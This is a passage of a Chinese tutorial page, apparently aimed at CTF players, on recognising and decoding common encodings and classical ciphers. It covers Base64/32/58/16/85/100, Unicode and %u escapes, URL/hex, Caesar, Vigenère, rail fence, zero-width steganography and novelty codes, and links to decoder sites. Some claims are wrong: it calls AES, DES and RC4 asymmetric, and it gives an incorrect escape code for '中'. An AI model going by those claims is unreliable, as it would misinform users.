</tbody></table>
<h2 id="Base64使用注意问题"><a href="#Base64使用注意问题" class="headerlink" title="Base64使用注意问题"></a>Base64使用注意问题</h2><h3 id="一、Base64和URL传参问题"><a href="#一、Base64和URL传参问题" class="headerlink" title="一、Base64和URL传参问题"></a>一、Base64和URL传参问题</h3><p>标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的“&#x2F;”和“+”字符变为形如“%XX”的形式，而这些“%”号在存入数据库时还需要再进行转换，因为ANSI SQL中已将“%”号用作通配符。</p>
<p>为解决此问题，可采用一种用于URL的改进Base64编码，它在末尾填充’&#x3D;’号，并将标准Base64中的“+”和“&#x2F;”分别改成了“-”和“_”，这样就免去了在URL编解码和数据库存储时所要作的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。</p>
<h3 id="二、Base64和URL传参问题改善"><a href="#二、Base64和URL传参问题改善" class="headerlink" title="二、Base64和URL传参问题改善"></a>二、Base64和URL传参问题改善</h3><p>另有一种用于正则表达式的改进Base64变种，它将“+”和“&#x2F;”改成了“!”和“-”，因为“+”,“*”以及前面在IRCu中用到的“[”和“]”在正则表达式中都可能具有特殊含义。</p>
<p>此外还有一些变种，它们将“+&#x2F;”改为“*-”或“.*”（用作编程语言中的标识符名称）或“.-”（用于XML中的Nmtoken）甚至“_:”（用于XML中的Name）。</p>
<h3 id="三、Base64转换后比原有的字符串长1-3"><a href="#三、Base64转换后比原有的字符串长1-3" class="headerlink" title="三、Base64转换后比原有的字符串长1&#x2F;3"></a>三、Base64转换后比原有的字符串长1&#x2F;3</h3><p>Base64要求把每三个8Bit的字节转换为四个6Bit的字节（3<em>8 &#x3D; 4</em>6 &#x3D; 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1&#x2F;3。</p>
<h3 id="四、Base64转换总结"><a href="#四、Base64转换总结" class="headerlink" title="四、Base64转换总结"></a>四、Base64转换总结</h3><p>Base64转换，最好是不要用在加密上，尤其是参数加密，很容易出问题。</p>
<h2 id="2、Base58——示例6tmHCZvhgfNjQu"><a href="#2、Base58——示例6tmHCZvhgfNjQu" class="headerlink" title="2、Base58——示例6tmHCZvhgfNjQu"></a>2、Base58——示例<code>6tmHCZvhgfNjQu</code></h2><p><strong>它最大的特点是没有等号</strong></p>
<p>Base58是用于比特币（Bitcoin）中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。</p>
<p>相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+“和”&#x2F;“符号。</p>
<p>比特币的Base58字母表：</p>
<p>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</p>
<p>简单的说：Base58一种编码方式，跟十进制，十六进制一样，不过更短更省空间。</p>
<p><strong>Base58的原理是什么？</strong></p>
<p>二进制：0和1</p>
<p>十进制：1到10</p>
<p>十六进制：十进制的基础上加上了A-F 六个字母</p>
<p>Base58可以理解为一种58进制。</p>
<p>Base58包含了阿拉伯数字、小写英文字母，大写英文字母。</p>
<p>但是去掉了一些容易混淆的数字和字母：0（数字0）、O（o的大写字母）、l（ L的小写字母）、I（i的大写字母）</p>
<h2 id="3、Base32——示例GEZDGNBVGY3TQOJQGE"><a href="#3、Base32——示例GEZDGNBVGY3TQOJQGE" class="headerlink" title="3、Base32——示例GEZDGNBVGY3TQOJQGE======"></a>3、Base32——示例<code>GEZDGNBVGY3TQOJQGE======</code></h2><p><strong>他的特点是明文超过十个后面就会有很多等号</strong></p>
<p>Base32使用了ASCII编码中可打印的32个字符(大写字母AZ和数字27)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组，由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位，则在编码后数据补充”&#x3D;”，一个”&#x3D;”相当于一个组(5个二进制位)，编码后的数据是原先的8&#x2F;5倍. <strong>Base32编码表</strong></p>
<table>
<thead>
<tr>
<th align="left">值</th>
<th align="left">符号</th>
<th align="left">值</th>
<th align="left">符号</th>
<th align="left">值</th>
<th align="left">符号</th>
<th align="left">值</th>
<th align="left">符号</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">A</td>
<td align="left">8</td>
<td align="left">I</td>
<td align="left">16</td>
<td align="left">Q</td>
<td align="left">24</td>
<td align="left">Y</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">B</td>
<td align="left">9</td>
<td align="left">J</td>
<td align="left">17</td>
<td align="left">R</td>
<td align="left">25</td>
<td align="left">Z</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">C</td>
<td align="left">10</td>
<td align="left">K</td>
<td align="left">18</td>
<td align="left">S</td>
<td align="left">26</td>
<td align="left">2</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">D</td>
<td align="left">11</td>
<td align="left">L</td>
<td align="left">19</td>
<td align="left">T</td>
<td align="left">27</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">E</td>
<td align="left">12</td>
<td align="left">M</td>
<td align="left">20</td>
<td align="left">U</td>
<td align="left">28</td>
<td align="left">4</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">F</td>
<td align="left">13</td>
<td align="left">N</td>
<td align="left">21</td>
<td align="left">V</td>
<td align="left">29</td>
<td align="left">5</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">G</td>
<td align="left">14</td>
<td align="left">O</td>
<td align="left">22</td>
<td align="left">W</td>
<td align="left">30</td>
<td align="left">6</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">H</td>
<td align="left">15</td>
<td align="left">P</td>
<td align="left">23</td>
<td align="left">X</td>
<td align="left">31</td>
<td align="left">7</td>
</tr>
<tr>
<td align="left">填充</td>
<td align="left">&#x3D;</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</p>
<p>由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“&#x3D;”。填充“&#x3D;”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“&#x3D;”符号。</p>
<p><strong>与Base64相比，Base32具有许多优点：</strong></p>
<ul>
<li>适合不区分大小写的文件系统，更利于人类口语交流或记忆。</li>
<li>结果可以用作文件名，因为它不包含路径分隔符 “&#x2F;”等符号。</li>
<li>排除了视觉上容易混淆的字符，因此可以准确的人工录入。（例如，RFC4648符号集忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆）。</li>
<li>排除填充符号“&#x3D;”的结果可以包含在URL中，而不编码任何字符。</li>
</ul>
<p>Base32也比Base16有优势：</p>
<ul>
<li>Base32比Base16占用的空间更小。（1000比特数据Base32需要200个字符，而Base16则为250个字符）</li>
</ul>
<p>Base32的缺点：</p>
<ul>
<li>Base32比Base64多占用大约20％的空间。因为Base32使用8个ASCII字符去编码原数据中的5个字节数据，而Base64是使用4个ASCII字符去编码原数据中的3个字节数据。</li>
</ul>
<h2 id="4、Base16——示例61646D696E"><a href="#4、Base16——示例61646D696E" class="headerlink" title="4、Base16——示例61646D696E"></a>4、Base16——示例<code>61646D696E</code></h2><p><strong>它的特点是没有等号并且数字要多于字母</strong></p>
<p>Base16编码的方式：</p>
<p>1.将数据(根据ASCII编码，UTF-8编码等)转成对应的二进制数，不足8比特位高位补0。然后将所有的二进制全部串起来，4个二进制位为一组，转化成对应十进制数。</p>
<p>2.根据十进制数值找到Base16编码表里面对应的字符。Base16是4个比特位表示一个字符，所以原始是1个字节(8个比特位)刚好可以分成两组,也就是说原先如果使用ASCII编码后的一个字符，现在转化成两个字符。数据量是原先的2倍。</p>
<table>
<thead>
<tr>
<th align="left">值</th>
<th align="left">编码</th>
<th align="left">值</th>
<th align="left">编码</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">0</td>
<td align="left">8</td>
<td align="left">8</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">1</td>
<td align="left">9</td>
<td align="left">9</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">2</td>
<td align="left">10</td>
<td align="left">A</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">3</td>
<td align="left">11</td>
<td align="left">B</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">4</td>
<td align="left">12</td>
<td align="left">C</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">5</td>
<td align="left">13</td>
<td align="left">D</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">6</td>
<td align="left">14</td>
<td align="left">E</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">7</td>
<td align="left">15</td>
<td align="left">F</td>
</tr>
</tbody></table>
<p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“&#x3D;”符号。</p>
<h2 id="5、Base85——示例-X4hDWe0rkE-G-OdP4CT-N"><a href="#5、Base85——示例-X4hDWe0rkE-G-OdP4CT-N" class="headerlink" title="5、Base85——示例@:X4hDWe0rkE(G[OdP4CT]N#"></a>5、Base85——示例<code>@:X4hDWe0rkE(G[OdP4CT]N#</code></h2><p><strong>特点是奇怪的字符比较多，但是很难出现等号</strong></p>
<h2 id="6、Base100——示例👘👛👤👠👥"><a href="#6、Base100——示例👘👛👤👠👥" class="headerlink" title="6、Base100——示例👘👛👤👠👥"></a>6、Base100——示例<code>👘👛👤👠👥</code></h2><p><strong>特点就是一堆Emoji表情</strong></p>
<p>Base100编码&#x2F;解码工具（又名：Emoji表情符号编码&#x2F;解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。</p>
<h3 id="常用解密网站："><a href="#常用解密网站：" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p>Base64：</p>
<ul>
<li><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://tool.oschina.net/encrypt?type=3" >tool.oschina.net<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.sojson.com/base64.html" >www.sojson.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://base64.us/" >base64.us<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>Base58：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://www.metools.info/code/c74.html" >www.metools.info<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> Base32、16：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.qqxiuzi.cn/bianma/base.php" >www.qqxiuzi.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> Base100：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://www.atoolbox.net/Tool.php?Id=936" >www.atoolbox.net<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="AES、DES、RC4、Rabbit、Triple-DES（3DES）"><a href="#AES、DES、RC4、Rabbit、Triple-DES（3DES）" class="headerlink" title="AES、DES、RC4、Rabbit、Triple DES（3DES）"></a>AES、DES、RC4、Rabbit、Triple DES（3DES）</h1><p>这些都是非对称性加密算法，就是引入了密钥，密文特征与Base64类似，放个图，就不多说了</p>
<h1 id="Unicode、HTML实体编码、16进制Unicode"><a href="#Unicode、HTML实体编码、16进制Unicode" class="headerlink" title="Unicode、HTML实体编码、16进制Unicode"></a>Unicode、HTML实体编码、16进制Unicode</h1><h2 id="1、Unicode——汉字示例这、字母示例t、数字符号示例5"><a href="#1、Unicode——汉字示例这、字母示例t、数字符号示例5" class="headerlink" title="1、Unicode——汉字示例这、字母示例t、数字符号示例5"></a>1、Unicode——汉字示例<code>这</code>、字母示例<code>t</code>、数字符号示例<code>5</code></h2><p><strong>可以说Unicode与HTML实体编码是一个东西</strong></p>
<p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。</p>
<h2 id="2、HTML实体编码——示例与Unicode相同"><a href="#2、HTML实体编码——示例与Unicode相同" class="headerlink" title="2、HTML实体编码——示例与Unicode相同"></a>2、HTML实体编码——示例与Unicode相同</h2><p>字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。</p>
<p>这么做的目的主要有两个： １、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体： 小于号这样写：&lt; 或 &lt; 大于号这样写：&gt; 或 &gt; 前面的写法称为实体名称，后面的写法则是实体编号。<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.qqxiuzi.cn/wz/zixun/1681.htm" >ISO-8859-1字符集<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。 ２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。</p>
<h2 id="2、16进制Unicode——示例-u8fd9-u662f-u4e00"><a href="#2、16进制Unicode——示例-u8fd9-u662f-u4e00" class="headerlink" title="2、16进制Unicode——示例\u8fd9\u662f\u4e00"></a>2、16进制Unicode——示例<code>\u8fd9\u662f\u4e00</code></h2><h3 id="常用解密网站：-1"><a href="#常用解密网站：-1" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><ul>
<li>Unicode：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.sojson.com/unicode.html" >www.sojson.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>16进制Unicode：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://www.msxindl.com/tools/unicode16.asp" >www.msxindl.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>HTML字符实体：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.qqxiuzi.cn/bianma/zifushiti.php" >www.qqxiuzi.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<h1 id="Escape编码-加密、Unescape解码-解密、-u编码、-u解码"><a href="#Escape编码-加密、Unescape解码-解密、-u编码、-u解码" class="headerlink" title="Escape编码&#x2F;加密、Unescape解码&#x2F;解密、%u编码、%u解码"></a>Escape编码&#x2F;加密、Unescape解码&#x2F;解密、%u编码、%u解码</h1><p><strong>特征：以<code>%u</code>开头</strong></p>
<p><strong>Escape&#x2F;Unescape加密解码&#x2F;编码解码</strong>,又叫%u编码，从以往经验看编码字符串出现有”u”，它是unicode编码，那么Escape编码采用是那一种unicode实现形式呢。其实是UTF-16BE模式。这样一来问题非常简单了。 <strong>Escape编码&#x2F;加密</strong>,就是字符对应UTF-16 16进制表示方式前面加%u。<strong>Unescape解码&#x2F;解密</strong>，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”，反之也一样！因为目前%字符，常用作URL编码，所以%u这样编码已经逐渐被废弃了！</p>
<p>基本类型只对汉字进行编码，复杂类型是所有字符均可</p>
<h3 id="常用解密网站：-2"><a href="#常用解密网站：-2" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://web.chacuo.net/charsetescape/" >http://web.chacuo.net/charsetescape/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="URL、Hex编码"><a href="#URL、Hex编码" class="headerlink" title="URL、Hex编码"></a>URL、Hex编码</h1><p><strong>这两种加密的密文是一样的，不同的是当你用url编码网站时是不会把http进行编码的，而Hex编码则全部转化了</strong></p>
<p>encodeURIComponent() 函数 与 encodeURI() 函数的区别 请注意 encodeURIComponent() 函数 与 encodeURI() 函数的区别之处，前者假定它的参数是 URI 的一部分（比如协议、主机名、路径或查询字符串）。因此 encodeURIComponent() 函数将转义用于分隔 URI 各个部分的标点符号。</p>
<h3 id="常用解密网站：-3"><a href="#常用解密网站：-3" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p>Hex编码：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.107000.com/T-Hex" >https://www.107000.com/T-Hex<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> URL 编码：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.sojson.com/encodeurl.html" >https://www.sojson.com/encodeurl.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码W型"><a href="#凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码W型" class="headerlink" title="凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码W型"></a>凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码W型</h1><p>这几类密码原理都是移位调换加密，破解难度低</p>
<p><strong>常用解密网站</strong></p>
<ul>
<li>维基利亚密码<a class="link"   href="https://ctf.bugku.com/tool/vigenere" >https://ctf.bugku.com/tool/vigenere<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>栅栏密码<a class="link"   href="https://ctf.bugku.com/tool/railfence" >https://ctf.bugku.com/tool/railfence<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>凯撒密码<a class="link"   href="https://ctf.bugku.com/tool/caesar" >https://ctf.bugku.com/tool/caesar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<h2 id="1、凯撒密码——示例iodj-khoor-zrug-123"><a href="#1、凯撒密码——示例iodj-khoor-zrug-123" class="headerlink" title="1、凯撒密码——示例iodj{khoor_zrug_123}"></a>1、凯撒密码——示例<code>iodj&#123;khoor_zrug_123&#125;</code></h2><p><strong>只对字母进行加密，常用于CTF比赛中</strong></p>
<p>凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息，故称凯撒密码。此为一种位移加密手段，只对26个（大小写）字母进行位移加密，规则相当简单，容易被破解。下面是明文字母表移回3位的对比： 明文字母表 X Y Z A B C D E F G H I J K L M N O P Q R S T U V W 密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 然后A变成D，B变成E，Z变成C。 字母最多可移动25位（按字母表）。通常为向后移动，如果您想向前移动1位，则相当于向后移动25位，位移选择为25位。</p>
<h2 id="2、维吉尼亚密码——示例fmcg-iglmq-wptd-123"><a href="#2、维吉尼亚密码——示例fmcg-iglmq-wptd-123" class="headerlink" title="2、维吉尼亚密码——示例fmcg{iglmq_wptd_123}"></a>2、维吉尼亚密码——示例<code>fmcg&#123;iglmq_wptd_123&#125;</code></h2><p><strong>可以说是凯撒密码的加强版，引入了密钥</strong></p>
<p>维吉尼亚密码，它将凯撒密码的所有26种排列放到一个表中，形成26行26列的加密字母表。此外，维吉尼亚密码必须有一个由字母组成的密钥，至少有一个字母，最多与明文字母有相同数量的字母。 在凯撒密码中，每个字母都会进行一定偏移值转换，例如，当偏移值是3时，则B被转换为E，C转换成F…。在维吉尼亚密码加密中，则是由具有不同偏移的凯撒密码构成的。 要生成密码，需要使用表格方法，此表(如图所示)包含26行字母表，每一行从上一行到左行被一位偏移。加密时使用哪一行字母表是基于密钥的，在加密过程中密钥会不断变化。 例如，假设明文为： BTTACKATDAFG 选择一个关键字并重复它以获得密钥，例如，当关键字是LIMN时，键是： LIMNLIMNLIMN 在明文中的第一个字母B，对应于密钥中的第一个字母L，使用加密字母表中的L行字母进行加密，得到第一个字母的密文M。同样，第二个明文字母是T，它用表中的I行加密，得到第二个密文B。通过类比，我们可以得到： 明文：BTTACKATDAFG 键：LIMNLIMNLIMN 密文：MBFNNSMGOIRT 解密的过程是加密的逆过程。例如，密钥的第一个字母对应的L行字母表，发现密文的第一个字母M位于B列，因此明文的第一个字母是B。密钥的第二个字母对应于I行字母表，而密文的第二个字母B位于该行的T列中，因此明文的第二个字母是T。等等，你可以得到明文。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://www.metools.info/res/imgs/weijiniyamima.png"
                      alt="维基利亚密码码表"
                ></p>
<h2 id="3、栅栏密码基础型"><a href="#3、栅栏密码基础型" class="headerlink" title="3、栅栏密码基础型"></a>3、栅栏密码基础型</h2><p><strong>栅栏密码是按一定规则将明文内容互相调换了位置</strong></p>
<p>栅栏密码(Rail fence Cipher)基础型加密方式，是一种简单的移动字符位置的加密方法，首先把加密的明文分成N个一组，然后把每组的第1、第2、第M个字符连起来，形成无规律的密文字符串。</p>
<p>例如字符串“123456789abc”，首先将字符串分成3组，如下排列： 1234 5678 9abc 依次取每一组字符，组成加密后密文：“15926a37b48c”。</p>
<h2 id="4、栅栏密码W型"><a href="#4、栅栏密码W型" class="headerlink" title="4、栅栏密码W型"></a>4、栅栏密码W型</h2><p>栅栏密码W型加密算法： 栅栏密码(Rail fence Cipher)，扩展变种W型，采用先把明文类似”W”形状进行排列，然后再按栏目顺序1-N，取每一栏的所有字符值，组成加密后密文。 比如字符串“123456789”，采用栏目数为3的时，明文将采用如下排列： 1—5—9 -2-4-6-8- –3—-7– 取每一栏所有字符串，组成加密后密文：“159246837”。 W型栅栏密码加密方式，比传统型栅栏密码加密方法，算法略有增强，但目前已只能用于学习算法验证。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h1 id="文本隐藏加密、零宽隐写"><a href="#文本隐藏加密、零宽隐写" class="headerlink" title="文本隐藏加密、零宽隐写"></a>文本隐藏加密、零宽隐写</h1><h2 id="1、文本隐藏加密"><a href="#1、文本隐藏加密" class="headerlink" title="1、文本隐藏加密"></a>1、文本隐藏加密</h2><p><strong>特征：加密过的密文会比原文的字节数多，当你按删除键的时候会发现某一处要按好多下才能把前面的字删掉</strong></p>
<p>原理**：它的原理是在密文中加入了不可见字符组成的编码，例如上述看似九个字符的一句话，通过<a class="link"   href="https://www.qqxiuzi.cn/zh/zishu-zijieshu/" >字数查询<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>可知它实际上有87个字符，多出的字符是由<a class="link"   href="https://www.qqxiuzi.cn/zh/space.html" >零宽空格<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>实现的编码，因为零宽空格不占据空间，所以看不出它的存在。</p>
<p><strong>使用</strong>：在进行文本隐藏加密时，将需要隐藏的文字写在括号中，就像这样“你好（有才华），我好喜欢你（画的画）！”，然后加密即可隐藏括号内的文字。同时可以设定一个密码，这样只有知道密码的人才能解密隐藏的文字。密码可以是数字、字母和下划线，最多九位。</p>
<h2 id="2、零宽隐写"><a href="#2、零宽隐写" class="headerlink" title="2、零宽隐写"></a>2、零宽隐写</h2><p><strong>特征：解密后明文与密文会分开显示，密文一般隐藏在第一个字后面，不信你试试，保证你十下之内删不完</strong></p>
<p>与上面文本隐藏加密的原理一样，但过程不一样</p>
<h3 id="常用解密网站：-4"><a href="#常用解密网站：-4" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p>文本隐藏加密：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.qqxiuzi.cn/bianma/yincangjiami.php" >www.qqxiuzi.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 零宽隐写：<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://yuanfux.github.io/zero-width-web/" >yuanfux.github.io<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="特殊暗号类加密"><a href="#特殊暗号类加密" class="headerlink" title="特殊暗号类加密"></a>特殊暗号类加密</h1><p>这类加密都是特征性比较强的，易辨别</p>
<h2 id="1、猪圈密码"><a href="#1、猪圈密码" class="headerlink" title="1、猪圈密码"></a>1、猪圈密码</h2><p><strong>特点：只能对字母加解密并且符号无法复制，粘贴后会直接显示明文</strong></p>
<p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码，曾经是美国内战时盟军使用的密码，目前仅在密码教学、各种竞赛中使用。</p>
<p><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://www.metools.info/code/c90.html" >http://www.metools.info/code/c90.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="2、与佛论禅"><a href="#2、与佛论禅" class="headerlink" title="2、与佛论禅"></a>2、与佛论禅</h2><p>**特点：就是你看不懂的佛语</p>
<h3 id="常用解密网站：-5"><a href="#常用解密网站：-5" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://www.keyfc.net/bbs/tools/tudoucode.aspx" >http://www.keyfc.net/bbs/tools/tudoucode.aspx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="3、百家姓暗号"><a href="#3、百家姓暗号" class="headerlink" title="3、百家姓暗号"></a>3、百家姓暗号</h2><p>特征：不要多说当你看到一串百家姓的时候多半就是这个暗号了</p>
<p>当他解密的的时候前面会多一串固定字符</p>
<h3 id="常用解密网站：-6"><a href="#常用解密网站：-6" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><ul>
<li><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.ahz0.com/bjx.html" >https://www.ahz0.com/bjx.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.w168.net/anhao.html" >https://www.w168.net/anhao.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://api.dujin.org/baijiaxing/" >https://api.dujin.org/baijiaxing/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.ddosi.com/ah.html" >https://www.ddosi.com/ah.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<h2 id="4、卡尔达诺栅格码"><a href="#4、卡尔达诺栅格码" class="headerlink" title="4、卡尔达诺栅格码"></a>4、卡尔达诺栅格码</h2><p><strong>特征：把明文伪装成垃圾邮件，看着这么多内容，其实我只是加密了admin</strong></p>
<h3 id="常用解密网站：-7"><a href="#常用解密网站：-7" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.spammimic.com/" >https://www.spammimic.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="5、莫尔斯电码"><a href="#5、莫尔斯电码" class="headerlink" title="5、莫尔斯电码"></a>5、莫尔斯电码</h2><p><strong>特征：密文由不规律的<code>.</code>、<code>/</code>、<code>-</code>组成</strong></p>
<ul>
<li>摩尔斯电码（Morse alphabet）（又译为摩斯电码）是一种时通时断的信号代码，这种信号代码通过不同的排列顺序来表达不同的英文字母、数字和标点符号等。</li>
<li>由美国人摩尔斯（Samuel Finley Breese Morse）于1837年发明，为摩尔斯电报机的发明（1835年）提供了条件。</li>
<li>摩尔密码加密的字符只有字符，数字，标点，不区分大小写，支持中文汉字</li>
